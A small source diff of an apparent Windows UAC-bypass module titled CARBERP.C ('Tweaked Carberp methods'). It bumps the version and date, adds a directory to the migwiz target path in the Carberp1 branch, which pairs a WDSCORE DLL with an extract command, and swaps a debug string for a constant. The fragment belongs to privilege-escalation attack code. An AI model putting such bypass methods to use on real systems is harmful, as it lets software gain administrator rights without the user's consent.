@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     2.10
+*  VERSION:     2.20
 *
-*  DATE:        16 Apr 2016
+*  DATE:        22 Apr 2016
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -83,6 +83,7 @@ BOOL ucmWusaMethod(
     case UacMethodCarberp1:
         _strcat(szSourceDll, WDSCORE_DLL);
         lpCommandLine = CMD_EXTRACT_MIGWIZ;
+        _strcat(szTargetProcess, MIGWIZ_DIR);
         _strcat(szTargetProcess, MIGWIZ_EXE);
         break;
 
@@ -98,7 +99,7 @@ BOOL ucmWusaMethod(
     }
 
     if (!PathFileExists(szTargetProcess)) {
-        OutputDebugString(L"[UCM] Target application not found");
+        OutputDebugString(T_TARGETNOTFOUND);
         return FALSE;
     }
 
